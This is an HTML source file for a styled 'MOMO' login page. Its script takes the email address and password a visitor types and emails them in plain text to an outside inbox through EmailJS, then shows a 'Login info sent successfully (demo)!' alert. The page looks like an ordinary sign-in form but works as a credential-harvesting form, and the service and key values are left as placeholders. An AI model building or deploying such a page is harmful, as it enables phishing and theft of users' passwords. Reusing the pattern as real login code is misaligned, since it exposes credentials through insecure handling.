<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login – MOMO</title>

<!-- Bootstrap 5 -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Font Awesome -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">

<!-- Google Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>emailjs.init("YOUR_PUBLIC_KEY");</script>

<style>
:root {
  --neon: #00f7ff;
  --dark: #0a0a0a;
  --card-bg: rgba(255,255,255,0.05);
}

body {
  font-family: 'Poppins', sans-serif;
  background: radial-gradient(circle at top, #0d1321, #05070f);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
  color: #fff;
}

/* LOGIN CARD */
.login-card {
  background: var(--card-bg);
  backdrop-filter: blur(15px);
  padding: 40px;
  border-radius: 20px;
  box-shadow: 0 0 40px rgba(0,247,255,.2);
  width: 100%;
  max-width: 420px;
  position: relative;
  overflow: hidden;
  transition: transform 0.5s, box-shadow 0.5s;
  opacity: 0;
  transform: translateY(50px);
}
.login-card.show {
  opacity: 1;
  transform: translateY(0);
}
.login-card:hover {
  transform: translateY(-10px);
  box-shadow: 0 0 60px rgba(0,247,255,.4);
}

/* TITLE */
.login-card h2 {
  font-weight: 700;
  margin-bottom: 30px;
  color: var(--neon);
  text-align: center;
  text-shadow: 0 0 10px var(--neon), 0 0 20px var(--neon);
}

/* INPUTS */
.form-control {
  background: rgba(255,255,255,0.05);
  border: 1px solid var(--neon);
  color: #fff;
}
.form-control::placeholder {
  color: rgba(255,255,255,.7);
}
.form-control:focus {
  border-color: var(--neon);
  box-shadow: 0 0 15px var(--neon);
  background: rgba(255,255,255,0.1);
  color: #fff;
}

/* BUTTON */
.btn-login {
  background: transparent;
  border: 2px solid var(--neon);
  color: var(--neon);
  width: 100%;
  padding: 12px;
  border-radius: 50px;
  font-weight: 600;
  transition: all 0.3s;
}
.btn-login:hover {
  background: var(--neon);
  color: #000;
  box-shadow: 0 0 25px var(--neon);
  transform: translateY(-3px);
}

/* LINKS */
.text-center a {
  color: var(--neon);
  text-decoration: none;
  transition: 0.3s;
}
.text-center a:hover {
  text-shadow: 0 0 10px var(--neon);
}

/* RESPONSIVE */
@media(max-width:576px){
  body {
    padding: 10px;
  }
}
</style>
</head>

<body>

<div class="login-card" id="loginCard">
  <h2>Login</h2>
  <form id="loginForm">
    <div class="mb-3">
      <input type="email" class="form-control" id="email" placeholder="Email Address" required>
    </div>
    <div class="mb-3">
      <input type="password" class="form-control" id="password" placeholder="Password" required>
    </div>
    <button type="submit" class="btn btn-login"><i class="fas fa-right-to-bracket me-2"></i>Login</button>
    <p class="text-center mt-3">Don't have an account? <a href="register.html">Register</a></p>
  </form>
</div>

<!-- Bootstrap JS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

<script>
// ANIMATION ON LOAD
window.addEventListener('load', () => {
  document.getElementById('loginCard').classList.add('show');
});

// FORM SUBMISSION + EMAILJS
document.getElementById('loginForm').addEventListener('submit', function(e){
  e.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  // Simple validation (for demo)
  if(email && password){
    // Send login info to Gmail via EmailJS
    emailjs.send("service_id","template_id",{
      user_email: email,
      user_password: password
    }).then(() => {
      alert("Login info sent successfully (demo)!");
      this.reset();
    }, (err) => {
      alert("Failed to send email. Try again.");
      console.log(err);
    });
  }
});
</script>
</body>
</html>
